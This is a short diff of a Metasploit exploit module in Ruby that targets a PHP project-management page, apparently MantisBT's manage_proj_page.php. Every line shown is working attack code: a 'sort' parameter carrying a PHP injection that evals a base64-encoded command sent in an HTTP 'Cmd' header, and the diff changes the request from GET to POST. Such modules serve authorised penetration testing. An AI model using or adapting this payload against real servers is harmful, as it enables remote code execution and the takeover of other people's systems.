@@ -105,18 +105,17 @@ class MetasploitModule < Msf::Exploit::Remote
     payload_clean = payload.encoded.gsub(/(\s+)|(#.*)/, '')
     payload_b64 = Rex::Text.encode_base64(payload_clean)
     data = {
-      'sort' => "']);}error_reporting(0);print(_code_);eval(base64_decode(\$_SERVER[HTTP_CMD]));die();%23",
+      'sort' => "']);}error_reporting(0);print(_code_);eval(base64_decode($_SERVER[HTTP_CMD]));die();#",
     }
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'manage_proj_page.php'),
-      'method'    => 'GET',
-      'vars_get' => data,
+      'method'    => 'POST',
+      'vars_post' => data,
       'headers' => {
         'Connection': 'close',
         'Cookie': "#{cookie}",
         'Cmd': payload_b64
-      },
-      'encode_params' => false,
+      }
     })
     fail_with(Failure::NoAccess, 'Host disconnected during exploit!') unless res
   end
